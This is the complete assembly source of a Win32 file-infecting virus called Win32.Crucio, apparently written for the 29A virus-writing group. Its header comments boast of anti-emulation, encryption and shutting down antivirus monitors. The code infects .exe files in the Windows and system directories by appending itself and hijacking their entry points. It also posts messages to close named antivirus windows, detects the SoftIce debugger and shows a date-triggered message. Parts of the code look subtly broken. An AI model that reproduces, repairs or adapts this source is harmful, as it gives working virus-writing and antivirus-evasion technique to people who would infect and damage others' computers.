;                  께께께께께께께께께께께께께께께께께께께께께�
;                   ccc   rrrr     u      u      ccc   i    oo
;                  c      r   r    u      u     c      i   o  o
;                 c       r    r   u      u    c       i  o    o
;                c        r   r    u      u   c        i o      o
;                c        rrrr     u      u   c        i o      o 
;                 c       r   r    u      u    c       i  o    o
;                  c      r    r    u    u      c      i   o  o
;                   ccc   r     r     uu         ccc   i    oo
;                  께께께께께께께께께께께께께께께께께께께께께�



;Win32.Crucio by powerdryv = Surya

;This was my very 1st of the viruses.Now, since I wanted to contribute
;to 29A,I value-added to this virus. The virus now is encrypted with a
;simple Sliding Key Alogo.,(XOR being the operation). For each dword
;being encrypted the Key increases by 4.After the XOR operation is per-
;formed the dword gets again encrypted thru FPU instuction.The algo.
;used for encryption is simple.In 1st step the dword get squared, then
;its added to itself and again it gets squared.So u see the simplicity.

;   Anti-Emulation : Yes, again using FPI
;   Anti-AV : Shuts down AV monitors
;   PayLoad : On every 25th of month shows a message box
;   Resident : No
;   Poly : No
;   Sets up SEH frams, (well that's a necessity)
                                                        

.586
.587
.model flat
jumps

extrn ExitProcess:proc
extrn MessageBoxA:proc

SizeOfVirus     equ     (offset EndOfVirus-StartOfVirus)/4
EncodedVirus    equ     (EEndOfVirus-EStartOfVirus)/4
SizeOne equ     (StartOfVirus-EStartOfVirus)/4

.data
szTitle   db      "Win32.Crucio by Surya",0

Message db      "In every color there's the light",13
        db      "In every stone sleeps a crystal",13
        db      "Remember the Shaman when he used to say:",13
        db      "Man is the dream of the dolphin.",0

SoftIce9x      db      "\\.\SICE",0
SoftIceNT      db      "\\.\NTSICE",0

.code
        StartOfVirus    label   byte

Start:	call Delta
Delta:	fnop
	pop ebp
	mov eax, offset Delta
        fild [ebp]
	fild [eax]
	fsub
	fabs
	fnop
	fistp dword ptr [Impy]
	mov ebp, Impy
	call CheckDebggers
	mov ecx, EncodedVirus
	lea edi, [ebp+EStartOfVirus]
	call Decoder
	jmp RealStart
Impy dd 0

RealStart:	
EStartOfVirus	label	byte
	
	mov esi, [esp]
	and esi, 0FFFF0000h
	mov ecx, 5

Check4MZ: 
	sub esi, 10000h
        	cmp word ptr [esi], "ZM"
	je Check4PE
        	loop Check4MZ
                	mov ecx, cs
                	xor cl, cl
                	jecxz WinNT
                	mov esi, 0BFF70000h
	jmp Check4PE
WinNT:
	mov esi, 077F00000h

Check4PE: cmp dword ptr [esi+80h], 'EP'
	jne Check4MZ
	mov dword ptr [ebp+@Kernel@], esi
	xchg eax, esi

        call SetSEH
	mov esp, [esp+8h]
	jmp ResSEH
SetSEH:
	push dword ptr fs:[0]
	mov fs:[0], esp


@1:	lea edi, [ebp+ApiOffsets]
        	lea esi, [ebp+ApiNames]
        	call GetApi
	call CloseAV

CheckDebggers2:
        	push 0
        	push 80h                 
        	push 3h            
        	push 0h
	push 1h
        	push 0C0000000h
        	push offset SoftIce9x
        	call [ebp+@CreateFileA@]
	inc eax
        	jnz Detected
        	dec eax

        	push 0
        	push 80h                 
        	push 3h            
        	push 0h
	push 1h
        	push 0C0000000h
        	push offset SoftIceNT
        	call [ebp+@CreateFileA@]
	inc eax
        	jnz Detected
        	dec eax

PayLoad:
	lea eax, [ebp+Samay]
	push eax
	call [ebp+@GetSystemTime@]
	cmp word ptr [ebp+S_wDay], 25h
	je Detected
	
	call MainInfection1
	call MainInfection2
ResSEH:
	pop dword ptr fs:[0]
	push 0
	call ExitProcess

MainInfection1:
	push 128
	lea eax, [ebp+offset windir]
	push eax
	mov eax, [ebp+offset @GetWindowsDirectoryA@]
	call eax

	push 128
	lea eax, [ebp+offset sysdir]
	push eax
	mov eax, [ebp+offset @GetSystemDirectoryA@]
	call eax

Return:	ret

MainInfection2:
@3:	lea eax, [ebp+windir]
	push eax
	call [ebp+@SetCurrentDirectoryA@]
	call FindThem
	jmp ResSEH
	
	lea eax, [ebp+sysdir]
	push eax
	call [ebp+@SetCurrentDirectoryA@]
	call FindThem
        jmp ResSEH

FindThem		proc
	lea eax, [ebp+Win32_Find_Data]
	push eax
	lea eax, [ebp+EXEtension]
	push eax
	call [ebp+@FindFirstFileA@]
	inc eax
	jz Failed2Find
	dec eax
	mov dword ptr [ebp+SearchHandle], eax

@@1:
	push dword ptr [ebp+OldEIP]
	push dword ptr [ebp+NewBase]
	call InfectThem
	pop dword ptr [ebp+NewBase]
	push dword ptr [ebp+OldEIP]
	
@@2:
	lea edi, [ebp+Win32_Find_Data]
	mov ecx, MAX_PATH
	xor al, al
	rep stosb

	lea eax, [ebp+Win32_Find_Data]
	push eax
	push dword ptr [ebp+EXEtension]
	call [ebp+@FindNextFileA@]
	test eax, eax
	jz Failed2Find
	jmp @@1
@@3:
	push dword ptr [ebp+SearchHandle]
	call [ebp+@FindClose@]

Failed2Find: ret
FindThem		endp

GetApi	proc

@_1:	push esi
	push edi
	call GetTheApis
	pop edi
	pop esi
	stosd
	xchg edi, esi
	xor al, al

@_2:	scasb
	jnz @_2
	xchg edi, esi

@_3:	cmp byte ptr [esi], 0BBh
	je Return2
	jmp @_1

Return2:	ret
GetApi	endp

GetTheApis      proc
	mov edx, esi
	mov edi, esi
	xor al, al
	
@@_1:	scasb
	jnz @@_1
	sub edi, esi
	mov ecx, edi

	xor eax, eax
	mov word ptr [ebp+Counter], ax
	mov esi, [ebp+@Kernel@]
	add esi, 3ch
	lodsw
        	add eax, [ebp+@Kernel@]
	mov esi, [eax+78h]
	add esi, 1ch
	add esi, [ebp+@Kernel@]
	lodsd
	add eax, [ebp+@Kernel@]
	mov dword ptr [ebp+@AddyTable@], eax
	lodsd
	add eax, [ebp+@Kernel@]
	push eax
	lodsd
	add eax, [ebp+@Kernel@]
        mov dword ptr [ebp+@OrdinalTable@], eax
	pop esi
	xor ebx,ebx

@@_2:	push esi
	lodsd
	add eax, [ebp+@Kernel@]
	mov esi, eax
	mov edi, edx
	push ecx
	cld
	rep cmpsb
	pop ecx
	jz @@_3
	pop esi
	add esi, 4
	inc ebx
	inc word ptr [ebp+Counter]
	jmp @@_2

@@_3:    	pop esi
	movzx eax, word ptr [ebp+Counter]
	shl eax, 1
	add eax, dword ptr [ebp+@OrdinalTable@]
	xor esi, esi
	xchg eax, esi
	lodsw
	shl eax, 2
	add eax, dword ptr [ebp+@AddyTable@]
	mov esi, eax
	lodsd
	add eax, [ebp+@Kernel@]
	ret
GetTheApis      endp

InfectThem	proc
        lea eax, [ebp+WFD_szFileName]
	push 80h
	push eax
	call [ebp+@SetFileAttributesA@]

	call OpenIt
	inc eax
	jz Failed2Open
	dec eax
	mov [ebp+FileHandle], eax	;dword ptr

	mov ecx, [ebp+WFD_nFileSizeLow]
        call CreateMapOfIt
	test eax, eax
	jz CantMap		;to Close the file
	mov [ebp+MapHandle], eax

	call MapIt
	test eax, eax
	jz UnmapIt
	mov [ebp+MapAddy], eax

	mov esi, [eax+3ch]
	add esi, eax
	cmp dword ptr [esi], 'EP'
	jne LeaveIt
	cmp dword ptr [esi+4ch], 'aea'	;Gaea
	jne LeaveIt

	push dword ptr [esi+3ch]
	push dword ptr [ebp+MapAddy]
	call [ebp+@CloseHandle@]
	pop ecx

        	mov eax, [ebp+WFD_nFileSizeLow]
	add eax, SizeOfVirus
        	call AlignIt
	xchg ecx, eax
	
	call CreateMapOfIt
	test eax, eax
	jz CantMap	;to Close the file
	
	mov [ebp+MapHandle], eax
	mov ecx, [ebp+NewSize]
	call MapIt
	test eax, eax
	jz UnmapIt
	mov [ebp+MapAddy], eax

	mov esi, [eax+3ch]
	add esi, eax
	mov [ebp+PEHeader], esi
	xor eax, eax	
	mov ax, word ptr [esi+6ch]	;
	dec eax
	imul eax, eax, 28h
	add esi, 78h
	add esi, eax
	mov ebx, [ebp+PEHeader+74h]
	shl ebx, 3
	add esi, ebx

	mov eax, [ebp+PEHeader+28h]
	mov [ebp+OldEIP], eax	;dword ptr
	mov eax, [ebp+PEHeader+34h]
	mov [ebp+NewBase], eax	;dword ptr

	mov ebx, [esi+10h]
	mov edx, ebx
	mov ebx, [esi+14h]
	push ebx
	mov edi, [ebp+PEHeader]

	mov eax, edx
	add eax, [esi+0ch]
	mov [edi+28h], eax
	mov dword ptr [ebp+NewEIP], eax
	
	mov eax, [esi+10h]
	add eax, SizeOfVirus
	mov ecx, [edi+3ch]
	call AlignIt
	
	mov [esi+10h], eax
	mov [esi+08h], eax
	pop ebx
	mov eax, [esi+10ch]
	add eax, [esi+0ch]
	mov [edi+50h], eax
	or dword ptr [esi+24h], 0A0000020h

	mov dword ptr [edi+4ch], 'aea'
	lea esi, [ebp+Start]
	mov edi, ebx
	add edi, dword ptr [ebp+MapAddy]
        mov ecx, SizeOne
	rep movsd

	mov ecx, EncodedVirus
	lea esi, [ebp+RealStart]
	call RandomNo
	mov [ebp+EncKey], eax
	finit

Loop1:	xor esi, [ebp+EncKey]
	add [ebp+EncKey], 4h

	fild dword ptr [esi]
	fild dword ptr [esi]
	fmul
	fadd st, st
	fistp dword ptr [ebx]
	fild dword ptr [ebx]
	fild dword ptr [ebx]
	fmul
	fistp dword ptr [esi]

	movsd
	add esi, 4h
	loop Loop1
	lea esi, [ebp+Decoder]
	mov ecx, (Ending-Decoder)/4

Loop3:
	movsd
	add esi, 4h
        loop Loop3
	jmp UnmapIt
	
LeaveIt:
	call TruncateIt
UnmapIt:
	push dword ptr [ebp+MapAddy]
	call [ebp+@UnmapViewOfFile@]

	push dword ptr [ebp+MapHandle]
	call [ebp+@CloseHandle@]
CantMap:
	push dword ptr [ebp+FileHandle]
	call [ebp+@CloseHandle@]
	jmp ResSEH

Detected:
        	push    0                      
                        push    offset szTitle     
        	push    offset Message
        	push    00h
        	call    MessageBoxA                     
	push 0
	call ExitProcess

Failed2Open:
	push dword ptr [ebp+WFD_dwFileAttributes]
        	lea eax, [ebp+WFD_szFileName] 
	push eax
	call [ebp+@SetFileAttributesA@]
	ret
InfectThem		endp

AlignIt   proc
	push ebx
	xor ebx, ebx
	push eax
	div ecx
	pop eax
	sub ecx, ebx
	add eax, ecx
	pop ebx
	ret
AlignIt   endp

CreateMapOfIt	proc
	push 0
	push ecx
	push 0
	push 4h
	push dword ptr [ebp+FileHandle]
	call [ebp+@CreateFileMappingA@]
	ret
CreateMapOfIt	endp

MapIt	proc
	push ecx
	push 0
	push 0
	push 2h
	push dword ptr [ebp+MapHandle]
	call [ebp+@MapViewOfFile@]
	ret
MapIt	endp

OpenIt	proc
	push 0
	push 0
	push 3h	
	push 0
	push 1h
	push 80000000h or 40000000h
	push eax
	call [ebp+@CreateFileA@]
	ret
OpenIt	endp

TruncateIt      proc
	push 0
	push 0
	push ecx
	push dword ptr [ebp+FileHandle]
	call [ebp+@SetFilePointer@]	
        	push dword ptr [ebp+FileHandle]
	call [ebp+@SetEndOfFile@]
	ret
TruncateIt      endp

RandomNo		proc	
        	db 0fh, 31h
	mov [ebp+Ran0], eax
	call [ebp+@GetTickCount@]
	mov [ebp+Ran1], eax
	call [ebp+@GetTickCount@]
	mov [ebp+Ran2], eax
	call [ebp+@GetTickCount@]
	mov [ebp+Ran3], eax
	add eax, [ebp+Ran1]
        	call ClDoer
	ror eax, cl
	add eax, [ebp+Ran0]
	shl eax, 7h
	call ClDoer
	rol eax, cl
	add eax, [ebp+Ran2]
	sub eax, [ebp+Ran3]
	call ClDoer
	ror eax, cl
        mov [ebp+EncKey], eax
        ret

ClDoer  proc near
        in al, 40h
        mov cl, al 
        ret
ClDoer  endp
RandomNo		endp

CloseAV		proc
        	lea eax, [ebp+AVList]
Loop2:
	call CloseAVs
	xor al, al
	scasb
	jnz $-1
        cmp byte ptr [edi], 0BBh
	jnz Loop2
	ret
CloseAV		endp

CloseAVs		proc
	push edi
	push 0
	call [ebp+@FindWindowA@]
	test eax, eax
	jz Return3

	push 0
	push 0
	push 12h
	push eax
	call [ebp+@PostMessageA@]
	xor cl, cl
	org $-1
Return3:
	ret
CloseAVs		endp

	db	"I inspire.....",0

ApiNames                 label   byte
@FindFirstFileA	db	"FindFirstFileA",0
@FindNextFileA	db	"FindNextFileA",0
@FindClose	db	"FindClose",0
@CreateFileA	db	"CreateFileA",0
@SetFilePointer	db	"SetFilePointer",0
@SetFileAttributesA	db	"SetFileAttributesA",0
@CloseHandle	db	"CloseHandle",0
@GetCurrentDirectoryA	db	"GetCurrentDirectoryA",0
@SetCurrentDirectoryA	db	"SetCurrentDirectoryA",0
@GetWindowsDirectoryA	db	"GetWindowsDirectoryA",0
@GetSystemDirectoryA	db	"GetSystemDirectoryA",0
@CreateFileMappingA		db	"CreateFileMappingA",0
@MapViewOfFile	db	"MapViewOfFile",0
@UnmapViewOfFile	db	"UnmapViewOfFile",0
@SetEndOfFile	db	"SetEndOfFile",0
@GetTickCount	db	"GetTickCount",0
@GetSystemTime	db	"GetSystemTime",0
@FindWindowA	db	"FindWindowA",0
@PostMessageA	db	"PostMessageA",0
                        db      0BBh

AVList	label	byte
	db      "AVP Monitor",0
	db      "Amon Antivirus Monitor",0
	db      "McAfee Scan",0	
	db      0BBh


EXEtension              db      '*.exe',0
@Kernel@        dd      00000000h
EncKey          dd      00000000h

@Start@		dd	00000000h
@AddyTable@	dd	00000000h	
@OrdinalTable@	dd	00000000h
FileHandle		dd	00000000h
SearchHandle	dd	00000000h
MapHandle	dd	00000000h
MapAddy		dd	00000000h
PEHeader		dd	00000000h
NewEIP		dd	00000000h
NewSize         dd      00000000h
Counter         dw      0000h

ApiOffsets		label   byte
@FindFirstFileA@	dd	0
@FindNextFileA@	dd	0
@FindClose@             dd              0
@CreateFileA@          dd              0
@SetFilePointer@	dd              0
@SetFileAttributesA@		dd	0
@CloseHandle@	dd	0
@GetCurrentDirectoryA@	dd	0
@SetCurrentDirectoryA@	dd	0
@GetWindowsDirectoryA@	dd	0
@GetSystemDirectoryA@	dd	0
@CreateFileMappingA@	dd	0
@MapViewOfFile@		dd	0
@UnmapViewOfFile@	dd      	0
@SetEndOfFile@ 	dd	0
@GetTickCount@	dd	0
@GetSystemTime@	dd	0
@FindWindowA@	dd	0
@PostMessageA@	dd	0

Ran1    dd      0
Ran2    dd      0
Ran0    dd      0
Ran3    dd      0

MAX_PATH                equ     260

FILETIME                STRUC
FT_dwLowDateTime        dd      ?
FT_dwHighDateTime       dd      ?
FILETIME                ENDS

Win32_Find_Data         label   byte
WFD_dwFileAttributes    dd      ?
WFD_ftCreationTime      FILETIME ?
WFD_ftLastAccessTime    FILETIME ?
WFD_ftLastWriteTime     FILETIME ?
WFD_nFileSizeHigh       dd      ?
WFD_nFileSizeLow        dd      ?
WFD_dwReserved0         dd      ?
WFD_dwReserved1         dd      ?
WFD_szFileName          db      MAX_PATH dup (?)
WFD_szAlternateFileName db      13 dup (?)
                        db      03 dup (?)

Samay              label   byte
S_wYear		dw	?
S_wMonth		dw	?
S_wDayOfWeek	dw	?
S_wDay		dw	?
S_wHour		dw	?
S_wMinute		dw	?
S_wSecond	dw	?
S_wMilliseconds	dw	?


sysdir	db	128h dup(0)
windir	db	128h dup(0)
curdir	db	128h dup(0)

OldEIP	dd	0
NewBase	dd	0

	EEndOfVirus	label	byte

Decoder	proc	
	test ebp, ebp
	jz EndDecod
	mov eax, dword [ebp+EncKey]
	mov ebx, 2h
	finit
Looploopy:
	mov edx, dword ptr [edi]

	fild dword ptr [edx]
	fsqrt
	fistp dword ptr [Var1]
	fild dword ptr [ebx]
	fild dword ptr [Var1]
	fdiv
	fsqrt
	
	xor edx, eax
	add eax, 4h
	mov dword ptr [edi], edx
	add edi, 4
	loop Looploopy
EndDecod: ret

CheckDebggers:
	mov ecx, fs:[20h]
	jecxz EndDecod
	mov dword ptr [ebp+EncKey], -1
	ret
Decoder endp

Var1 dd 0

        EndOfVirus      label   byte

Ending:	end Start

;			I inspire....